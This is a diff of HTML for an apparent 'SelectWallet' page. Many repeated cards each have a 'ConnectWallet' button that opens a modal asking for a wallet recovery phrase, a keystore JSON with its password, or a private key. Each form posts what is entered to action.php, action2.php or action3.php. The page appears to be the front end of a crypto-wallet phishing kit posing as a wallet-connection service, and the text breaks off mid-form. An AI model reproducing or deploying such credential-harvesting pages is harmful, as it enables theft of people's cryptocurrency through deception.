+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="keystore">
+  <form method="post" action="action2.php">
+  <div class="form-group">
+  <textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
+  </div>
+  <div class="form-group">
+  <input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">
+  Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+  </p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="privatekey">
+  <form method="post" action="action3.php">
+  <div class="form-group">
+  <input class="form-control" name="privatekey" placeholder="Private Key" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  </div>
+  </div>
+  <div class="modal-footer">
+  <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+  <button type="button" class="btn btn-primary">Send message</button>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+</div>
+  
+</div>
+
+<div class="row blog_box">
+
+  <div class="col-md-4 pb-4 extra">
+  <div class="blog_img">
+  <img src="SelectWallet/yoroi.png"  class="img-fluid" alt="">
+  <div class="icon">
+  <i class="fas fa-pen"></i>
+  </div>
+  </div>
+  <div class="content">
+  <div class="authore">
+  <p>by admin</p>
+  <!-- <p>22/08/2021</p> -->
+  </div>
+  <!-- <button style="float: right;" type="button" class=".">connectWallet</button> -->
+  <button type="button"  class="" style="float: right;" data-bs-toggle="modal" data-bs-target="#exampleModal" data-bs-whatever="@mdo">ConnectWallet</button>
+  
+  
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+  <div class="modal-content">
+  <div class="modal-header">
+  <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+  </div>
+  <div class="modal-body">
+  <div class="container-fluid">
+  <div class="row">
+  <div class="col-md-4 offset-md-4">
+  <ul style="display: flex;list-style: none;text-align: left;">
+  <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+  </ul>
+  </div>
+  </div>
+  </div>
+  <div class="tab-content">
+  <div role="tabpanel" class="tab-pane fade show active" id="phrase">
+  <form method="post" action="action.php">
+  <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="keystore">
+  <form method="post" action="action2.php">
+  <div class="form-group">
+  <textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
+  </div>
+  <div class="form-group">
+  <input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">
+  Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+  </p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="privatekey">
+  <form method="post" action="action3.php">
+  <div class="form-group">
+  <input class="form-control" name="privatekey" placeholder="Private Key" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  </div>
+  </div>
+  <div class="modal-footer">
+  <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+  <!-- <button type="button" class="btn btn-primary">Send message</button> -->
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  
+  <div class="col-md-4 pb-4 extra">
+  <div class="blog_img">
+  <img src="SelectWallet/4ab2542c2799c825a8465ba5ab8aa7def52b7904f38b74484af917ed9c0fc4e5.jpg"  class="img-fluid" alt="">
+  <div class="icon">
+  <i class="fas fa-pen"></i>
+  </div>
+  </div>
+  <div class="content">
+  <div class="authore">
+  <p>by admin</p>
+  <!-- <p>22/08/2021</p> -->
+  </div>
+  <!-- <button style="float: right;" type="button" class=".">connectWallet</button> -->
+  <button type="button"  class="." style="float: right;" data-bs-toggle="modal" data-bs-target="#exampleModal" data-bs-whatever="@mdo">ConnectWallet</button>
+  
+  
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+  <div class="modal-content">
+  <div class="modal-header">
+  <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+  </div>
+  <div class="modal-body">
+  <div class="container-fluid">
+  <div class="row">
+  <div class="col-md-4 offset-md-4">
+  <ul style="display: flex;list-style: none;text-align: left;">
+  <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+  </ul>
+  </div>
+  </div>
+  </div>
+  <div class="tab-content">
+  <div role="tabpanel" class="tab-pane fade show active" id="phrase">
+  <form method="post" action="action.php">
+  <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="keystore">
+  <form method="post" action="action2.php">
+  <div class="form-group">
+  <textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
+  </div>
+  <div class="form-group">
+  <input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">
+  Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+  </p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="privatekey">
+  <form method="post" action="action3.php">
+  <div class="form-group">
+  <input class="form-control" name="privatekey" placeholder="Private Key" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  </div>
+  </div>
+  <div class="modal-footer">
+  <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+  <!-- <button type="button" class="btn btn-primary">Send message</button> -->
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  
+  <div class="col-md-4 pb-4 extra">
+  <div class="blog_img">
+  <img src="SelectWallet/78640a74036794a5b7f8ea501887c168232723696db4231f54abd3fe524037b4.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -3723,7 +3716,984 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   
 </div>
+
+<div class="row blog_box">
+
+  <div class="col-md-4 pb-4 extra">
+  <div class="blog_img">
+  <img src="SelectWallet/img-28.jpg"  class="img-fluid" alt="">
+  <div class="icon">
+  <i class="fas fa-pen"></i>
+  </div>
+  </div>
+  <div class="content">
+  <div class="authore">
+  <p>by admin</p>
+  <!-- <p>22/08/2021</p> -->
+  </div>
+  <!-- <button style="float: right;" type="button" class=".">connectWallet</button> -->
+  <button type="button"  class="" style="float: right;" data-bs-toggle="modal" data-bs-target="#exampleModal" data-bs-whatever="@mdo">ConnectWallet</button>
+  
+  
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+  <div class="modal-content">
+  <div class="modal-header">
+  <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+  </div>
+  <div class="modal-body">
+  <div class="container-fluid">
+  <div class="row">
+  <div class="col-md-4 offset-md-4">
+  <ul style="display: flex;list-style: none;text-align: left;">
+  <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+  </ul>
+  </div>
+  </div>
+  </div>
+  <div class="tab-content">
+  <div role="tabpanel" class="tab-pane fade show active" id="phrase">
+  <form method="post" action="action.php">
+  <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="keystore">
+  <form method="post" action="action2.php">
+  <div class="form-group">
+  <textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
+  </div>
+  <div class="form-group">
+  <input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">
+  Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+  </p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="privatekey">
+  <form method="post" action="action3.php">
+  <div class="form-group">
+  <input class="form-control" name="privatekey" placeholder="Private Key" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  </div>
+  </div>
+  <div class="modal-footer">
+  <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+  <!-- <button type="button" class="btn btn-primary">Send message</button> -->
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  
+  <div class="col-md-4 pb-4 extra">
+  <div class="blog_img">
+  <img src="SelectWallet/img-33.jpg"  class="img-fluid" alt="">
+  <div class="icon">
+  <i class="fas fa-pen"></i>
+  </div>
+  </div>
+  <div class="content">
+  <div class="authore">
+  <p>by admin</p>
+  <!-- <p>22/08/2021</p> -->
+  </div>
+  <!-- <button style="float: right;" type="button" class=".">connectWallet</button> -->
+  <button type="button"  class="." style="float: right;" data-bs-toggle="modal" data-bs-target="#exampleModal" data-bs-whatever="@mdo">ConnectWallet</button>
+  
+  
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+  <div class="modal-content">
+  <div class="modal-header">
+  <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+  </div>
+  <div class="modal-body">
+  <div class="container-fluid">
+  <div class="row">
+  <div class="col-md-4 offset-md-4">
+  <ul style="display: flex;list-style: none;text-align: left;">
+  <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+  </ul>
+  </div>
+  </div>
+  </div>
+  <div class="tab-content">
+  <div role="tabpanel" class="tab-pane fade show active" id="phrase">
+  <form method="post" action="action.php">
+  <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="keystore">
+  <form method="post" action="action2.php">
+  <div class="form-group">
+  <textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
+  </div>
+  <div class="form-group">
+  <input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">
+  Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+  </p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="privatekey">
+  <form method="post" action="action3.php">
+  <div class="form-group">
+  <input class="form-control" name="privatekey" placeholder="Private Key" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  </div>
+  </div>
+  <div class="modal-footer">
+  <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+  <!-- <button type="button" class="btn btn-primary">Send message</button> -->
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  
+  <div class="col-md-4 pb-4 extra">
+  <div class="blog_img">
+  <img src="SelectWallet/6f9d21b4f537a5b82406ee97b1ed06311bf60500ac6e6fb822dd2de73dda0593.jpg"  class="img-fluid" alt="">
+  <div class="icon">
+  <i class="fas fa-pen"></i>
+  </div>
+  </div>
+  <div class="content">
+  <div class="authore">
+  <p>by admin</p>
+  <!-- <p>22/08/2021</p> -->
+  </div>
+  <!-- <button style="float: right;" type="button" class=".">connectWallet</button> -->
+  <button type="button"  class="." style="float: right;" data-bs-toggle="modal" data-bs-target="#exampleModal" data-bs-whatever="@mdo">ConnectWallet</button>
+  
+  
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+  <div class="modal-content">
+  <div class="modal-header">
+  <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+  </div>
+  <div class="modal-body">
+  <div class="container-fluid">
+  <div class="row">
+  <div class="col-md-4 offset-md-4">
+  <ul style="display: flex;list-style: none;text-align: left;">
+  <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+  </ul>
+  </div>
+  </div>
+  </div>
+  <div class="tab-content">
+  <div role="tabpanel" class="tab-pane fade show active" id="phrase">
+  <form method="post" action="action.php">
+  <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="keystore">
+  <form method="post" action="action2.php">
+  <div class="form-group">
+  <textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
+  </div>
+  <div class="form-group">
+  <input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">
+  Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+  </p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="privatekey">
+  <form method="post" action="action3.php">
+  <div class="form-group">
+  <input class="form-control" name="privatekey" placeholder="Private Key" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  </div>
+  </div>
+  <div class="modal-footer">
+  <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+  <button type="button" class="btn btn-primary">Send message</button>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  
 </div>
+
+<div class="row blog_box">
+
+  <div class="col-md-4 pb-4 extra">
+  <div class="blog_img">
+  <img src="SelectWallet/7c207664419cd871fc76a8e6d4496800877bcd9592eb42b4b987608344663f8f.jpg"  class="img-fluid" alt="">
+  <div class="icon">
+  <i class="fas fa-pen"></i>
+  </div>
+  </div>
+  <div class="content">
+  <div class="authore">
+  <p>by admin</p>
+  <!-- <p>22/08/2021</p> -->
+  </div>
+  <!-- <button style="float: right;" type="button" class=".">connectWallet</button> -->
+  <button type="button"  class="" style="float: right;" data-bs-toggle="modal" data-bs-target="#exampleModal" data-bs-whatever="@mdo">ConnectWallet</button>
+  
+  
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+  <div class="modal-content">
+  <div class="modal-header">
+  <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+  </div>
+  <div class="modal-body">
+  <div class="container-fluid">
+  <div class="row">
+  <div class="col-md-4 offset-md-4">
+  <ul style="display: flex;list-style: none;text-align: left;">
+  <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+  </ul>
+  </div>
+  </div>
+  </div>
+  <div class="tab-content">
+  <div role="tabpanel" class="tab-pane fade show active" id="phrase">
+  <form method="post" action="action.php">
+  <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="keystore">
+  <form method="post" action="action2.php">
+  <div class="form-group">
+  <textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
+  </div>
+  <div class="form-group">
+  <input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">
+  Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+  </p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="privatekey">
+  <form method="post" action="action3.php">
+  <div class="form-group">
+  <input class="form-control" name="privatekey" placeholder="Private Key" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  </div>
+  </div>
+  <div class="modal-footer">
+  <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+  <!-- <button type="button" class="btn btn-primary">Send message</button> -->
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  
+  <div class="col-md-4 pb-4 extra">
+  <div class="blog_img">
+  <img src="SelectWallet/img-44.jpg"  class="img-fluid" alt="">
+  <div class="icon">
+  <i class="fas fa-pen"></i>
+  </div>
+  </div>
+  <div class="content">
+  <div class="authore">
+  <p>by admin</p>
+  <!-- <p>22/08/2021</p> -->
+  </div>
+  <!-- <button style="float: right;" type="button" class=".">connectWallet</button> -->
+  <button type="button"  class="." style="float: right;" data-bs-toggle="modal" data-bs-target="#exampleModal" data-bs-whatever="@mdo">ConnectWallet</button>
+  
+  
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+  <div class="modal-content">
+  <div class="modal-header">
+  <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+  </div>
+  <div class="modal-body">
+  <div class="container-fluid">
+  <div class="row">
+  <div class="col-md-4 offset-md-4">
+  <ul style="display: flex;list-style: none;text-align: left;">
+  <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+  </ul>
+  </div>
+  </div>
+  </div>
+  <div class="tab-content">
+  <div role="tabpanel" class="tab-pane fade show active" id="phrase">
+  <form method="post" action="action.php">
+  <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="keystore">
+  <form method="post" action="action2.php">
+  <div class="form-group">
+  <textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
+  </div>
+  <div class="form-group">
+  <input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">
+  Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+  </p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="privatekey">
+  <form method="post" action="action3.php">
+  <div class="form-group">
+  <input class="form-control" name="privatekey" placeholder="Private Key" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  </div>
+  </div>
+  <div class="modal-footer">
+  <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+  <!-- <button type="button" class="btn btn-primary">Send message</button> -->
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  
+  <div class="col-md-4 pb-4 extra">
+  <div class="blog_img">
+  <img src="SelectWallet/img-26.jpg"  class="img-fluid" alt="">
+  <div class="icon">
+  <i class="fas fa-pen"></i>
+  </div>
+  </div>
+  <div class="content">
+  <div class="authore">
+  <p>by admin</p>
+  <!-- <p>22/08/2021</p> -->
+  </div>
+  <!-- <button style="float: right;" type="button" class=".">connectWallet</button> -->
+  <button type="button"  class="." style="float: right;" data-bs-toggle="modal" data-bs-target="#exampleModal" data-bs-whatever="@mdo">ConnectWallet</button>
+  
+  
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+  <div class="modal-content">
+  <div class="modal-header">
+  <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+  </div>
+  <div class="modal-body">
+  <div class="container-fluid">
+  <div class="row">
+  <div class="col-md-4 offset-md-4">
+  <ul style="display: flex;list-style: none;text-align: left;">
+  <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+  </ul>
+  </div>
+  </div>
+  </div>
+  <div class="tab-content">
+  <div role="tabpanel" class="tab-pane fade show active" id="phrase">
+  <form method="post" action="action.php">
+  <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="keystore">
+  <form method="post" action="action2.php">
+  <div class="form-group">
+  <textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
+  </div>
+  <div class="form-group">
+  <input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">
+  Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+  </p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="privatekey">
+  <form method="post" action="action3.php">
+  <div class="form-group">
+  <input class="form-control" name="privatekey" placeholder="Private Key" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  </div>
+  </div>
+  <div class="modal-footer">
+  <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+  <button type="button" class="btn btn-primary">Send message</button>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  
+</div>
+
+<div class="row blog_box">
+
+  <div class="col-md-4 pb-4 extra">
+  <div class="blog_img">
+  <img src="SelectWallet/1e04cf5cddcd84edb1370b12eae1fcecedf125b77209fff80e7ef2a6d3c74719.jpg"  class="img-fluid" alt="">
+  <div class="icon">
+  <i class="fas fa-pen"></i>
+  </div>
+  </div>
+  <div class="content">
+  <div class="authore">
+  <p>by admin</p>
+  <!-- <p>22/08/2021</p> -->
+  </div>
+  <!-- <button style="float: right;" type="button" class=".">connectWallet</button> -->
+  <button type="button"  class="" style="float: right;" data-bs-toggle="modal" data-bs-target="#exampleModal" data-bs-whatever="@mdo">ConnectWallet</button>
+  
+  
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+  <div class="modal-content">
+  <div class="modal-header">
+  <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+  </div>
+  <div class="modal-body">
+  <div class="container-fluid">
+  <div class="row">
+  <div class="col-md-4 offset-md-4">
+  <ul style="display: flex;list-style: none;text-align: left;">
+  <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+  </ul>
+  </div>
+  </div>
+  </div>
+  <div class="tab-content">
+  <div role="tabpanel" class="tab-pane fade show active" id="phrase">
+  <form method="post" action="action.php">
+  <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="keystore">
+  <form method="post" action="action2.php">
+  <div class="form-group">
+  <textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
+  </div>
+  <div class="form-group">
+  <input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">
+  Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+  </p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="privatekey">
+  <form method="post" action="action3.php">
+  <div class="form-group">
+  <input class="form-control" name="privatekey" placeholder="Private Key" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
